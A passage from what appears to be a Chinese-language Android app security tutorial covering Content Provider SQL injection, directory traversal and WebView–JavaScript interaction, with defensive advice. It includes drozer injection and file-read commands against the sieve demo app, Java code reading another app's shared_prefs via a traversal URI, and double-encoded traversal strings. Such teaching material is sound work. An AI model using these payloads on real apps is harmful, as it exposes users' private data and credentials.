class_">StringBuilder</span>(LOG_SEPARATOR);</span><br><span class="line">        sb.append(<span class="string">&quot;HEADERS FOR DOWNLOAD ID &quot;</span>).append(id).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowHeader</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;header&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowValue</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">            sb.append(rowHeader).append(<span class="string">&quot;: &quot;</span>).append(rowValue).append(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        log(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">        cur.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>安全防护</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.minSdkVersion不低于<span class="number">9</span></span><br><span class="line"><span class="number">2</span>.不向外部app提供数据的私有<span class="attribute">content</span> provider显示设置exported=”false”，避免组件暴露(编译api小于<span class="number">17</span>时更应注意此点)</span><br><span class="line"><span class="number">3</span>.内部app通过<span class="attribute">content</span> provid交换数据时，设置protectionLevel=”signature”验证签名</span><br><span class="line"><span class="number">4</span>.公开的<span class="attribute">content</span> provider确保不存储敏感数据</span><br><span class="line"> </span><br><span class="line">针对权限保护绕过防御措施：</span><br><span class="line"><span class="number">1</span>.使用Context<span class="selector-class">.checkCallingPermission</span>()和Context<span class="selector-class">.enforceCallingPermission</span>()来确保调用者拥有相应的权限，防止串谋攻击(confused deputy)。</span><br><span class="line"><span class="number">2</span>.可以使用如下函数，获取应用的permission保护级别是否与系统中已定义的permission保护级别一致。如果不一致，则抛出异常。</span><br></pre></td></tr></table></figure><h4 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h4><p><strong>原理介绍</strong></p><p>​        对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致sql注入攻击。<br>所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。应该避免使用SQLiteDatabase.rawQuery()进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。<br>另外一种方式是使用query(),insert(),update(),和delete()方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使bindString()绑定值。从而避免SQL注入攻击。</p><p><strong>drozer关于SQL注入的相关命令</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">检测SQL注入</span><br><span class="line"><span class="keyword">run</span> scanner.provider.injection -a 包名</span><br><span class="line"></span><br><span class="line">检测目录遍历</span><br><span class="line"><span class="keyword">run</span> scanner.provider.traversal -a 包名</span><br><span class="line"></span><br><span class="line">SQL注入</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> 具体uri + [--projection] [selection]</span><br><span class="line">示例： <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.DBContentProvider/Passwords/ </span></span><br><span class="line">--projection <span class="string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure><p>案例：sieve.apk</p><ul><li><p>检测SQL注入<br><code>run scanner.provider.injection</code>-<code>a &lt;包名&gt;</code><img src="2025-01-15-App安全分析指南/image-20240923184807857.png" alt="image-20240923184807857"></p></li><li><p>构造sql</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>列出所有表信息|</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>列出该app表信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.sqltables</span> -<span class="selector-tag">a</span>  com<span class="selector-class">.mwr</span><span class="selector-class">.example</span>.sieve</span><br></pre></td></tr></table></figure></li></ul><h4 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h4><p><strong>原理介绍</strong></p><p>Android Content Provider存在文件目录遍历安全漏洞，该漏洞源于对外暴露Content Provider组件的应用，没有对Content Provider组件的访问进行权限控制和对访问的目标文件的Content Query Uri进行有效判断，攻击者利用该应用暴露的Content Provider的openFile()接口进行文件目录遍历以达到访问任意可读文件的目的</p><p><strong>漏洞触发的前提条件</strong></p><p>对外暴露的Content Provider组件实现了openFile()接口<br>没有对所访问的目标文件Uri进行有效判断，如没有过滤限制如，“../”可实现任意可读文件的访问的Content Query Uri</p><p><strong>漏洞复现</strong></p><p>案例：<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044407">赶集网Android客户端Content Provider组件任意文件读取漏洞</a></p><p><strong>漏洞分析</strong></p><p>赶集网客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=”true”,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过”../“实现目录跨越，实现对任意私有数据的访问（当然，也可以访问任意外部存储数据，只是我们更关心私有敏感数据）。</p><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GJContentProviderFileOperations</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> getContentResolver().openInputStream(Uri.parse(<span class="string">&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;</span>));</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> in.read(buffer);</span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            n = in.read(buffer);</span><br><span class="line">            Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        debugInfo(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>案例2：sieve.apk</strong></p><ul><li><p>检测是否有目录遍历漏洞<br><code>run scanner.provider.traversal -a &lt;包名&gt;</code><img src="2025-01-15-App安全分析指南/image-20240923200141351.png" alt="image-20240923200141351"></p></li><li><p>读取系统文件<br><code>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code><img src="2025-01-15-App安全分析指南/image-20240923200417923.png" alt="image-20240923200417923"></p></li><li><p>下载系统文件<br><code>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db</code><img src="2025-01-15-App安全分析指南/image-20240923200859074.png" alt="image-20240923200859074"></p></li></ul><p>案例3：</p><p><strong>目标代码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line"><span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span>;</span><br><span class="line"><span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">    File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,paramUri.getLastPathSegment());</span><br><span class="line">    <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以从目标代码中分析，这段代码使用android.net.Uri.getLastPathSegment()从paramUri中获取文件名，然后将其放置在预定义好的目录IMAGE_DIRECTORY中，如果该URL是encoded编码后的，那么将可能导致目录遍历漏洞</p><p>Android4.3开始，Uri.getLastPathSegment()内部实现调用Uri.getPathSegments()</p><p>Uri.getPathSegments首先会通过getEncoded()获取一个路径，然后以”/“为分隔符将path分成片段，最后调用decode()方法解码</p><p>假如我们传递encoded编码后的url给getLastPathSegment()，编码后的分隔符就变成了%2F,绕过了内部的分割规则，那么返回的就可能不是真正想要的文件了。这是API设计方面的问题，直接导致了目录遍历漏洞</p><p>为了避免这种情况导致的目录遍历漏洞，开发者应该在传递给getLastPathSegment()之前解码，采用调用两次getLastPathSegment()方法的方式，第一次调用是为了解码，第二次调用期望得到正确的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span> <span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">这个编码后的URL： ..%<span class="number">2F</span>..%<span class="number">2F</span>..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml  </span><br><span class="line">第一次调用getLastPathSegment()，会返回../../../data/data/com.example.android.app/shared_prefs/Example.xml。  </span><br><span class="line">第二次调用getLastPathSegment()会返回Example.xml </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">然而攻击者可以采用一种叫做<span class="string">&quot;Double Encoding&quot;</span>的技术，使得第一次调用getLastPathSegment()后无法解码。</span><br><span class="line"> </span><br><span class="line">比如下面经过<span class="type">double</span> encoded后的string就可以绕过上面这种防御</span><br><span class="line"> </span><br><span class="line">%252E%252E%<span class="number">252F</span>%252E%252E%<span class="number">252F</span>%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml</span><br><span class="line"> </span><br><span class="line">第一次解码后： %2E%2E%<span class="number">2F</span>%2E%2E%<span class="number">2F</span>%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml</span><br><span class="line"> </span><br><span class="line">第二次解码后： ../../../data/data/com.example.android.app/shared_prefs/Example.xml</span><br><span class="line">仍会导致目录遍历。所以简单的解码后再传人也是不够的，仍然需要严格校验以确保path是期望的路径</span><br></pre></td></tr></table></figure><p><strong>安全防护</strong></p><ol><li>将不必要导出的Content Provider设置为不导出</li><li>去除没有必要的openFile()接口</li><li>过滤限制跨域访问，对访问的目标文件的路径进行有效判断</li><li>设置权限来进行内部应用通过Content Provider的数据共享</li></ol><h2 id="Webview漏洞"><a href="#Webview漏洞" class="headerlink" title="Webview漏洞"></a><strong>Webview漏洞</strong></h2><h3 id="WebView基本使用"><a href="#WebView基本使用" class="headerlink" title="WebView基本使用"></a>WebView基本使用</h3><h4 id="打开网页"><a href="#打开网页" class="headerlink" title="打开网页"></a>打开网页</h4><p><strong>控件注册</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Wind_webview&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><strong>代码实现</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得控件</span></span><br><span class="line">       <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview);</span><br><span class="line">       <span class="comment">//访问网页</span></span><br><span class="line">       webView.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">       <span class="comment">//系统默认会通过手机浏览器打开网页，为了能够直接通过WebView显示网页，则必须设置</span></span><br><span class="line">       webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">               <span class="comment">//使用WebView加载显示url</span></span><br><span class="line">               view.loadUrl(url);</span><br><span class="line">               <span class="comment">//返回true</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure><p>最后我们在配置文件中添加网络权限：</p><p><code>&lt;uses</code>-<code>permission android:name</code>=<code>&quot;android.permission.INTERNET&quot;` `/</code>&gt;</p><h4 id="远程加载、"><a href="#远程加载、" class="headerlink" title="远程加载、"></a>远程加载、</h4><p>js调用Android</p><p>在本地创建一个js文件,命名attack.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span><br><span class="line"><span class="language-javascript">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>开启一个http_server监听</p><p><code>python -m http.server 8080</code></p><p>编写java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line"><span class="comment">//参数1：Javascript对象名</span></span><br><span class="line"><span class="comment">//参数2：Java对象名</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line"><span class="comment">//loadData(String data, String mimeType, String encoding)</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 加载JS代码</span></span><br><span class="line"><span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ip地址填自己的/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="常用类使用"><a href="#常用类使用" class="headerlink" title="常用类使用"></a>常用类使用</h4><h5 id="WebSettings"><a href="#WebSettings" class="headerlink" title="WebSettings"></a><strong>WebSettings</strong></h5><p>作用：对WebView进行配置和管理</p><p>配置步骤：</p><p> 第一步：添加访问网络权限（AndroidManifest.xml）</p><p><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</code></p><p>注意：从Android 9.0（API级别28）开始，默认情况下禁用明文支持，会显示 <code>ERR_CLEARTEXT_NOT_PERMITTED</code>。因此http的url均无法在webview中加载，可以在manifest中application节点添加<code>android:usesCleartextTraffic=&quot;true&quot;</code>。</p><p>第二步：生成一个WebView组件（有两种方式）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式1：直接在在Activity中生成</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//方法2：在Activity的layout文件里添加webview控件：</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView1);</span><br></pre></td></tr></table></figure><p>第三步：进行配置-利用WebSettings子类（常见方法）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明WebSettings子类</span></span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> webView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//如果访问的页面中要与Javascript交互，则webview必须设置支持Javascript</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//支持插件</span></span><br><span class="line">webSettings.setPluginsEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭webview中缓存</span></span><br><span class="line">webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); </span><br><span class="line"></span><br><span class="line"><span class="comment">//设置可以访问文件</span></span><br><span class="line">webSettings.setAllowFileAccess(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p> 常见方法：设置WebView缓存</p><ul><li>当加载 html 页面时，WebView会在/data/data/包名目录下生成 database 与 cache 两个文件夹</li><li>请求的 URL记录保存在 WebViewCache.db，而 URL的内容是保存在 WebViewCache 文件夹下</li></ul><h5 id="WebViewClient类"><a href="#WebViewClient类" class="headerlink" title="WebViewClient类"></a><strong>WebViewClient类</strong></h5><p>作用：用来处理各种通知 &amp; 请求事件</p><p><strong>shouldOverrideUrlLoading()</strong></p><p>作用：打开网页时不调用系统浏览器， 而是在本WebView中显示；在网页上的所有加载都经过这个方法,这个函数我们可以做很多操作。</p><h4 id="webview与js加护"><a href="#webview与js加护" class="headerlink" title="webview与js加护"></a>webview与js加护</h4><p><img src="2025-01-15-App安全分析指南/905443_F97H8PAK73A38RC.png" alt="image-20220726171737615"></p><h5 id="Android调用JS"><a href="#Android调用JS" class="headerlink" title="Android调用JS"></a>Android调用JS</h5><p>准备js文件，放到assets中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;Android调用了JS的callJS方法&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Android调用JS方法测试<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在Java层中添加代码，进行调用JS文件以及JS中的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 先载入JS代码</span></span><br><span class="line"> <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title 